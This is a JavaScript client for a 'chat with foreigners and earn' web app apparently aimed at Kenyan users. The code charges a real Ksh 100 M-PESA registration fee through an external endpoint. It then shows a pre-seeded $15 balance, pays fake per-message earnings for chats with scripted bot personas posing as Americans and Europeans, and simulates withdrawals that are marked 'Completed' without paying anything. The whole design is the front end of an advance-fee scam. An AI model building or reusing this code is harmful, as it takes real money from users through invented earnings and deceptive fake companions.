// Chat Na Wazungu - Core Client State Machine

// Global App State
const state = {
  view: 'landing', // landing, wizard, dashboard
  wizardStep: 'register', // register, payment, success
  user: {
    username: '',
    email: '',
    phone: '',
    country: 'Kenya'
  },
  isSandbox: true, // Sandbox mode enabled by default for developer ease
  balance: 15.00,
  totalEarned: 15.00,
  chatsCount: 3,
  referralEarned: 5.00,
  activeChatPartner: null,
  activeChatMessages: [],
  pollingInterval: null,
  typingTimeout: null,
  
  // Simulated Wazungus Available
  wazungus: [
    {
      id: 'sarah_usa',
      name: 'Sarah 🇺🇸',
      country: 'United States',
      avatar: '👩🏼‍💼',
      rate: 0.15,
      intro: 'Hello there! Thanks for accepting my chat. I\'ve always wanted to visit East Africa, especially Kenya. How is your day going in Nairobi?',
      scriptIndex: 0,
      script: [
        'Oh wow, that sounds amazing! What is the weather like over there right now?',
        'Fascinating. I read about Swahili culture, can you teach me a simple phrase? How do you say "How are you?" and "Thank you"?',
        'Habari gani! Asante! Did I get that right? Haha, I\'m so excited to learn. What kind of food is popular over there?',
        'Ugali and Nyama Choma! I looked them up on Google, they look absolutely delicious. You are such a wonderful person to chat with!',
        'You\'re awesome! I\'m so happy we connected. I\'ll definitely keep chatting with you to learn more.'
      ]
    },
    {
      id: 'hans_germany',
      name: 'Hans 🇩🇪',
      country: 'Germany',
      avatar: '👨🏼‍💻',
      rate: 0.15,
      intro: 'Guten Tag! I am Hans. I am planning a safari photography trip to Masai Mara next year. Do you have any recommendations for the best months to visit?',
      scriptIndex: 0,
      script: [
        'Ah, July to October for the great wildebeest migration! Das ist super. I will definitely book my tickets around that time.',
        'Are there good local tour guides in Kenya, or should I book with international agencies?',
        'Perfect, local guides are always better to support the community. What photography gear would you recommend for the safari?',
        'Good point, a zoom lens is a must! Thank you for the incredible advice. Kenya sounds like a paradise for photographers!',
        'Vielen Dank! You\'ve been extremely helpful. Let\'s stay in touch!'
      ]
    },
    {
      id: 'chloe_uk',
      name: 'Chloe 🇬🇧',
      country: 'United Kingdom',
      avatar: '👩🏻‍🎨',
      rate: 0.15,
      intro: 'Hiya! I\'m Chloe. Just got off work and felt like chatting with someone from another side of the world. What do you do for fun in Kenya?',
      scriptIndex: 0,
      script: [
        'That sounds incredibly fun! In London, it\'s mostly rainy and we spend our time in cozy cafes or museums.',
        'Do you listen to a lot of music? What kind of music is big in East Africa right now? I\'d love to discover some new artists.',
        'Sauti Sol! Oh I love their vibe, just looked them up on Spotify. Their harmonies are beautiful!',
        'Absolutely brilliant! Thanks for sharing. What\'s your favorite thing about living in your country?',
        'That is so inspiring. I really love your positive energy! Thanks for chatting with me today.'
      ]
    }
  ]
};

// =========================================================================
// VIEW TRANSITION ENGINE
// =========================================================================
function switchView(viewName) {
  state.view = viewName;
  document.querySelectorAll('.view-section').forEach(section => {
    section.classList.remove('active');
  });
  const activeSection = document.getElementById(`${viewName}-view`);
  if (activeSection) {
    activeSection.classList.add('active');
    activeSection.scrollIntoView({ behavior: 'smooth' });
  }
}

function navigateToWizard() {
  switchView('wizard');
  switchWizardStep('register');
}

function switchWizardStep(stepName) {
  state.wizardStep = stepName;
  
  // Manage Substep Visibility
  document.querySelectorAll('.wizard-substep-content').forEach(substep => {
    substep.style.display = 'none';
  });
  document.getElementById(`wizard-step-${stepName}`).style.display = 'block';

  // Manage Progress Dots
  document.querySelectorAll('.progress-step').forEach(dot => {
    dot.classList.remove('active');
  });
  
  const stepDots = ['register', 'payment', 'success'];
  const currentIdx = stepDots.indexOf(stepName);
  for (let i = 0; i <= currentIdx; i++) {
    const dot = document.getElementById(`step-dot-${stepDots[i]}`);
    if (dot) dot.classList.add('active');
  }
}

// =========================================================================
// REGISTRATION FLOW (STEP A)
// =========================================================================
function handleInputFocus(fieldId) {
  const wrapper = document.getElementById(`wrapper-${fieldId}`);
  if (wrapper) wrapper.classList.add('focus');
}

function handleInputBlur(fieldId) {
  const wrapper = document.getElementById(`wrapper-${fieldId}`);
  if (wrapper) wrapper.classList.remove('focus');
}

function clearError(fieldId) {
  const label = document.getElementById(`label-${fieldId}`);
  const wrapper = document.getElementById(`wrapper-${fieldId}`);
  const errorMsg = document.getElementById(`error-${fieldId}`);
  
  if (label) label.classList.remove('error');
  if (wrapper) wrapper.classList.remove('error');
  if (errorMsg) {
    errorMsg.style.display = 'none';
    errorMsg.innerText = '';
  }
}

function showError(fieldId, message) {
  const label = document.getElementById(`label-${fieldId}`);
  const wrapper = document.getElementById(`wrapper-${fieldId}`);
  const errorMsg = document.getElementById(`error-${fieldId}`);
  
  if (label) label.classList.add('error');
  if (wrapper) wrapper.classList.add('error');
  if (errorMsg) {
    errorMsg.style.display = 'flex';
    errorMsg.innerText = `⚠️ ${message}`;
  }
}

function handleRegistration(event) {
  event.preventDefault();
  
  const username = document.getElementById('reg-username').value.trim();
  const email = document.getElementById('reg-email').value.trim();
  const phone = document.getElementById('reg-phone').value.trim();
  const country = document.getElementById('reg-country').value;
  const password = document.getElementById('reg-password').value;
  
  let isValid = true;
  
  // Username validation
  if (!username) {
    showError('username', 'Username is required');
    isValid = false;
  }
  
  // Email validation
  if (!email.includes('@')) {
    showError('email', 'Enter a valid email address');
    isValid = false;
  }
  
  // Phone validation (M-PESA formats)
  const cleanPhone = phone.replace(/[\s\-\+]/g, '');
  if (!phone.match(/^0[17]\d{8}$/) && !phone.match(/^(254|01)\d{8}$/)) {
    showError('phone', 'Enter a valid M-PESA phone number (07XX / 01XX / 254XX)');
    isValid = false;
  }
  
  // Password validation
  if (password.length < 6) {
    showError('password', 'Password must be at least 6 characters');
    isValid = false;
  }
  
  if (isValid) {
    // Save user state
    state.user = { username, email, phone, country };
    
    // Seed fields in next steps
    document.getElementById('pay-phone').value = phone;
    document.getElementById('withdraw-phone').value = phone;
    
    // Go to payment step
    switchWizardStep('payment');
  }
}

function navigateToLoginSim() {
  alert("Account database is locked for Render deployment setup. Please register a new account to test Sandbox features.");
}

// =========================================================================
// PAYMENT FLOW (STEP B)
// =========================================================================
function toggleSandboxMode() {
  const isChecked = document.getElementById('payment-sandbox-toggle').checked;
  state.isSandbox = isChecked;
  
  const sandboxLabel = document.querySelector('.dev-mode-label span');
  if (isChecked) {
    sandboxLabel.innerText = "Developer Sandbox Mode";
  } else {
    sandboxLabel.innerText = "Live M-PESA Payout Mode";
  }
}

function clearPayError() {
  const label = document.getElementById('label-payphone');
  const wrapper = document.getElementById('wrapper-payphone');
  const errorMsg = document.getElementById('error-payphone');
  
  if (label) label.classList.remove('error');
  if (wrapper) wrapper.classList.remove('error');
  if (errorMsg) errorMsg.style.display = 'none';
}

function showPayError(message) {
  const label = document.getElementById('label-payphone');
  const wrapper = document.getElementById('wrapper-payphone');
  const errorMsg = document.getElementById('error-payphone');
  
  if (label) label.classList.add('error');
  if (wrapper) wrapper.classList.add('error');
  if (errorMsg) {
    errorMsg.style.display = 'block';
    errorMsg.innerText = `⚠️ ${message}`;
  }
}

function updatePaymentLogs(message, showSpinner = true) {
  const logsBox = document.getElementById('payment-logs-box');
  const logsText = document.getElementById('payment-logs-text');
  const spinner = logsBox.querySelector('.spinner');
  
  logsBox.style.display = 'flex';
  logsText.innerText = message;
  spinner.style.display = showSpinner ? 'inline-block' : 'none';
}

// Trigger payment mechanism (integrates actual Render endpoint or simulates)
async function triggerMPESAPayment() {
  const phone = document.getElementById('pay-phone').value.trim();
  
  if (!phone.match(/^(07|01|254|\+254)\d{8,9}$/)) {
    showPayError("Enter a valid M-PESA number.");
    return;
  }
  
  clearPayError();
  
  // Disable button, show cancel button
  const payBtn = document.getElementById('btn-pay-trigger');
  const cancelBtn = document.getElementById('btn-pay-cancel');
  
  payBtn.disabled = true;
  payBtn.innerHTML = `<span>⏳ Waiting for payment...</span>`;
  cancelBtn.style.display = 'block';
  
  document.getElementById('payment-static-info').style.display = 'none';
  
  if (state.isSandbox) {
    // --- RUN SANDBOX SIMULATOR ---
    runSandboxPaymentSimulation();
  } else {
    // --- RUN LIVE M-PESA CALL ---
    runLiveMPESAPayment(phone);
  }
}

// Simulated payment loop for testing
function runSandboxPaymentSimulation() {
  let step = 0;
  const messages = [
    "Establishing secure connection to Safaricom Daraja API...",
    "Sending STK Push prompt to your phone...",
    "Prompt delivered successfully! Waiting for you to enter your M-PESA PIN...",
    "PIN validated! Confirming transaction details...",
    "Payment COMPLETED! Receipt Code: MPX9284102. Activating account..."
  ];
  
  updatePaymentLogs(messages[0]);
  
  const simInterval = setInterval(() => {
    step++;
    if (step < messages.length) {
      updatePaymentLogs(messages[step]);
    } else {
      clearInterval(simInterval);
      completePaymentFlow();
    }
  }, 2200);
  
  // Save interval to cancel it if user clicks cancel
  state.pollingInterval = simInterval;
}

// Calls original API at https://newfliza.onrender.com/api/boosts/paye
async function runLiveMPESAPayment(phoneNum) {
  updatePaymentLogs("Initiating live Safaricom STK Push connection...");
  
  try {
    const response = await fetch("https://newfliza.onrender.com/api/boosts/paye", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        phone: phoneNum,
        amount: 100,
        fee: 100,
        identificationNumber: state.user.email || state.user.username,
        customer_name: state.user.username || "Customer"
      })
    });
    
    const result = await response.json();
    
    if (!response.ok || !result.success) {
      throw new Error(result.error || "Daraja API returned an error response");
    }
    
    const boostId = result.boostId;
    updatePaymentLogs("STK Push sent! Please check your phone and enter your M-PESA PIN.");
    
    // Poll the status
    let pollCount = 0;
    const maxPolls = 24; // 2 minutes maximum
    
    state.pollingInterval = setInterval(async () => {
      pollCount++;
      try {
        const checkRes = await fetch(`https://newfliza.onrender.com/api/boosts/${boostId}`);
        const status = await checkRes.json();
        
        if (status.paid === true || status.paymentStatus === "COMPLETED") {
          clearInterval(state.pollingInterval);
          updatePaymentLogs("Payment Verified! Completing onboarding...", true);
          setTimeout(() => {
            completePaymentFlow();
          }, 1500);
        } else if (status.paymentStatus === "FAILED" || status.paymentStatus === "CANCELLED") {
          clearInterval(state.pollingInterval);
          resetPaymentFlow(`M-PESA prompt was ${status.paymentStatus.toLowerCase()}. Please try again.`);
        } else if (pollCount >= maxPolls) {
          clearInterval(state.pollingInterval);
          resetPaymentFlow("Payment check timed out. If you paid and were charged, please contact support.");
        }
      } catch (err) {
        clearInterval(state.pollingInterval);
        resetPaymentFlow("Could not verify status with Safaricom. Contact support.");
      }
    }, 5000);
    
  } catch (err) {
    resetPaymentFlow(err.message || "Failed to trigger live payment prompt. Safaricom network may be busy.");
  }
}

function cancelPaymentFlow() {
  if (state.pollingInterval) {
    clearInterval(state.pollingInterval);
    state.pollingInterval = null;
  }
  resetPaymentFlow("Payment flow cancelled by user.");
}

function resetPaymentFlow(errorMessage) {
  const payBtn = document.getElementById('btn-pay-trigger');
  const cancelBtn = document.getElementById('btn-pay-cancel');
  
  payBtn.disabled = false;
  payBtn.innerHTML = `<span>Pay Ksh 100 🚀</span>`;
  cancelBtn.style.display = 'none';
  
  document.getElementById('payment-logs-box').style.display = 'none';
  document.getElementById('payment-static-info').style.display = 'flex';
  
  if (errorMessage) {
    showPayError(errorMessage);
  }
}

function completePaymentFlow() {
  if (state.pollingInterval) {
    clearInterval(state.pollingInterval);
    state.pollingInterval = null;
  }
  
  switchWizardStep('success');
}

// =========================================================================
// DASHBOARD VIEW MECHANICS (STEP C -> DASHBOARD)
// =========================================================================
function enterDashboard() {
  switchView('dashboard');
  
  // Set User Profile Elements
  document.getElementById('dash-user-name').innerText = `@${state.user.username}`;
  document.getElementById('dash-user-avatar').innerText = state.user.username.charAt(0).toUpperCase();
  document.getElementById('welcome-user-text').innerText = `Welcome back, @${state.user.username}!`;
  
  // Set referral link dynamically
  const refLinkInput = document.getElementById('ref-link-input');
  refLinkInput.value = `${window.location.origin}/?ref=${state.user.username}`;
  
  // Populate Available Payout Info
  document.getElementById('quick-payout-phone').innerText = `M-PESA (${state.user.phone})`;
  document.getElementById('withdraw-phone').value = state.user.phone;
  document.getElementById('withdraw-avail-label').innerText = `Available: $${state.balance.toFixed(2)}`;
  
  // Initialize balance displays
  updateBalanceUI();
  
  // Build and render list of active incoming chat requests
  renderChatRequests();
}

function updateBalanceUI() {
  document.getElementById('kpi-balance').innerText = `$${state.balance.toFixed(2)}`;
  document.getElementById('kpi-total-earned').innerText = `$${state.totalEarned.toFixed(2)}`;
  document.getElementById('kpi-chats-count').innerText = state.chatsCount;
  document.getElementById('kpi-referral-earned').innerText = `$${state.referralEarned.toFixed(2)}`;
  document.getElementById('withdraw-avail-label').innerText = `Available: $${state.balance.toFixed(2)}`;
}

// Tab switcher inside simulated dashboard
function switchDashboardTab(tabId) {
  // Manage navigation highlight
  document.querySelectorAll('.menu-item').forEach(item => {
    item.classList.remove('active');
  });
  document.getElementById(`nav-${tabId}`).classList.add('active');
  
  // Manage tabs content
  document.querySelectorAll('.dashboard-section').forEach(section => {
    section.classList.remove('active');
  });
  document.getElementById(`tab-${tabId}`).classList.add('active');
  
  if (tabId === 'chat') {
    // Scroll chat window messages to bottom if open
    scrollChatToBottom();
  }
}

// =========================================================================
// CHAT PORTAL INTERACTION LOGIC
// =========================================================================
function renderChatRequests() {
  const container = document.getElementById('requests-list-container');
  container.innerHTML = '';
  
  state.wazungus.forEach(w => {
    const item = document.createElement('div');
    item.className = 'request-item';
    item.innerHTML = `
      <div class="item-left">
        <div class="avatar-md">${w.avatar}</div>
        <div class="wazungu-info">
          <span class="wazungu-name">${w.name}</span>
          <div class="wazungu-meta">
            <span>${w.country}</span>
            <span class="meta-dot"></span>
            <span class="rate-badge">$${w.rate.toFixed(2)}/msg</span>
          </div>
        </div>
      </div>
      <button class="btn-accept" onclick="acceptWazunguChat('${w.id}')">Accept Chat</button>
    `;
    container.appendChild(item);
  });
}

function acceptWazunguChat(wazunguId) {
  const partner = state.wazungus.find(w => w.id === wazunguId);
  if (!partner) return;
  
  state.activeChatPartner = partner;
  
  // Initialize Chat Interface View
  document.getElementById('chat-empty-state').style.display = 'none';
  document.getElementById('chat-active-state').style.display = 'flex';
  
  // Set chat header details
  document.getElementById('chat-partner-avatar').innerText = partner.avatar;
  document.getElementById('chat-partner-name').innerText = partner.name;
  
  // Seed first greeting message from Wazungu
  state.activeChatMessages = [
    { sender: 'wazungu', text: partner.intro, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }
  ];
  
  renderChatMessages();
  switchDashboardTab('chat');
}

function renderChatMessages() {
  const container = document.getElementById('chat-messages-container');
  container.innerHTML = '';
  
  state.activeChatMessages.forEach(msg => {
    const msgElement = document.createElement('div');
    msgElement.className = `msg-bubble ${msg.sender}`;
    msgElement.innerHTML = `
      <div>${msg.text}</div>
      <div class="msg-meta">${msg.time}</div>
    `;
    container.appendChild(msgElement);
  });
  
  scrollChatToBottom();
}

function scrollChatToBottom() {
  const container = document.getElementById('chat-messages-container');
  if (container) {
    container.scrollTop = container.scrollHeight;
  }
}

function handleChatInputKeypress(event) {
  if (event.key === 'Enter') {
    sendUserChatMessage();
  }
}

function sendUserChatMessage() {
  const input = document.getElementById('chat-message-input');
  const text = input.value.trim();
  if (!text || !state.activeChatPartner) return;
  
  // Add User Message to Array
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  state.activeChatMessages.push({ sender: 'user', text: text, time: time });
  
  // Clear input field
  input.value = '';
  renderChatMessages();
  
  // Trigger Satisfying Floating Earning Animation
  triggerFloatingEarnings();
  
  // Calculate earnings increment
  const rate = state.activeChatPartner.rate;
  state.balance += rate;
  state.totalEarned += rate;
  updateBalanceUI();
  
  // Start Wazungu Auto-reply timer (simulates dynamic bot typing and sending)
  showTypingIndicator();
}

function showTypingIndicator() {
  const container = document.getElementById('chat-messages-container');
  
  // Clear existing typing indicator
  const oldTyping = document.querySelector('.typing-indicator');
  if (oldTyping) oldTyping.remove();
  
  // Create typing animation block
  const typingEl = document.createElement('div');
  typingEl.className = 'typing-indicator';
  typingEl.innerHTML = `
    <div class="typing-dot"></div>
    <div class="typing-dot"></div>
    <div class="typing-dot"></div>
  `;
  
  container.appendChild(typingEl);
  scrollChatToBottom();
  
  if (state.typingTimeout) clearTimeout(state.typingTimeout);
  
  state.typingTimeout = setTimeout(() => {
    typingEl.remove();
    wazunguAutoReply();
  }, 1800);
}

function wazunguAutoReply() {
  const partner = state.activeChatPartner;
  if (!partner) return;
  
  let replyText = "";
  if (partner.scriptIndex < partner.script.length) {
    replyText = partner.script[partner.scriptIndex];
    partner.scriptIndex++;
  } else {
    replyText = "Haha, you are so interesting! Yes, that makes sense. I have to go cook dinner now but I would love to talk to you again later. You are truly an amazing companion!";
  }
  
  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
  state.activeChatMessages.push({ sender: 'wazungu', text: replyText, time: time });
  
  renderChatMessages();
}

function terminateChatSession() {
  if (state.typingTimeout) clearTimeout(state.typingTimeout);
  
  // Reset session
  state.activeChatPartner = null;
  state.activeChatMessages = [];
  
  document.getElementById('chat-active-state').style.display = 'none';
  document.getElementById('chat-empty-state').style.display = 'flex';
  
  // Increment completed count
  state.chatsCount++;
  updateBalanceUI();
  
  switchDashboardTab('overview');
}

// Satisfying visual floating text notification of money gained
function triggerFloatingEarnings() {
  const chatWindow = document.getElementById('chat-window-element');
  const coin = document.createElement('div');
  coin.className = 'floating-coin';
  coin.innerText = '+$0.15 🪙';
  
  // Random horizontal position near the bottom text bar
  const randomX = Math.random() * 200 + 100;
  coin.style.bottom = '60px';
  coin.style.left = `${randomX}px`;
  
  chatWindow.appendChild(coin);
  
  // Clear from DOM after animation completes
  setTimeout(() => {
    coin.remove();
  }, 1000);
}

// =========================================================================
// REFERRAL COPY LINK MECHANICS
// =========================================================================
function copyReferralLink() {
  const input = document.getElementById('ref-link-input');
  input.select();
  input.setSelectionRange(0, 99999);
  
  // Copy to clipboard API
  navigator.clipboard.writeText(input.value).then(() => {
    const btn = document.querySelector('.btn-copy');
    const originalText = btn.innerText;
    
    btn.innerText = 'Copied! ✓';
    btn.style.background = 'linear-gradient(135deg, #1d9e75, #1d9e75)';
    
    setTimeout(() => {
      btn.innerText = originalText;
      btn.style.background = '';
    }, 2000);
  });
}

// =========================================================================
// WITHDRAWALS MECHANICS
// =========================================================================
function handleWithdrawalRequest(event) {
  event.preventDefault();
  
  const method = document.getElementById('withdraw-method').value;
  const phone = document.getElementById('withdraw-phone').value.trim();
  const amount = parseFloat(document.getElementById('withdraw-amount').value);
  const errorMsg = document.getElementById('error-withdraw');
  const wrapper = document.getElementById('wrapper-withdraw-amount');
  
  errorMsg.style.display = 'none';
  wrapper.classList.remove('error');
  
  if (isNaN(amount) || amount <= 0) {
    errorMsg.style.display = 'block';
    errorMsg.innerText = '⚠️ Please enter a valid withdrawal amount.';
    wrapper.classList.add('error');
    return;
  }
  
  if (amount < 10.00) {
    errorMsg.style.display = 'block';
    errorMsg.innerText = '⚠️ Minimum withdrawal amount is $10.00 USD.';
    wrapper.classList.add('error');
    return;
  }
  
  if (amount > state.balance) {
    errorMsg.style.display = 'block';
    errorMsg.innerText = `⚠️ Insufficient funds. Available: $${state.balance.toFixed(2)} USD.`;
    wrapper.classList.add('error');
    return;
  }
  
  // Proceed with withdrawal simulation
  state.balance -= amount;
  updateBalanceUI();
  
  // Insert row into log table
  const tableBody = document.querySelector('#withdraw-table-log tbody');
  const refId = `TXN-${Math.floor(1000000 + Math.random() * 9000000)}`;
  const timeString = new Date().toLocaleString([], { hour: '2-digit', minute: '2-digit', month: 'short', day: 'numeric', year: 'numeric' });
  
  const newRow = document.createElement('tr');
  newRow.id = `row-${refId}`;
  newRow.innerHTML = `
    <td>${refId}</td>
    <td>${method.toUpperCase()}</td>
    <td>$${amount.toFixed(2)}</td>
    <td><span class="status-label status-pending">Processing</span></td>
    <td>${timeString}</td>
  `;
  
  // Insert at front
  tableBody.insertBefore(newRow, tableBody.firstChild);
  
  // Clear withdraw field
  document.getElementById('withdraw-amount').value = '';
  
  // Visual payout toast/notification
  alert(`Withdrawal request for $${amount.toFixed(2)} USD submitted successfully! Payout will arrive in your wallet shortly.`);
  
  // Simulate successful payment completion after 8 seconds
  setTimeout(() => {
    const statusCell = newRow.querySelector('td .status-label');
    if (statusCell) {
      statusCell.className = 'status-label status-completed';
      statusCell.innerText = 'Completed';
    }
    
    // Play sound / browser popup
    console.log(`Withdrawal ${refId} completed.`);
  }, 8000);
}
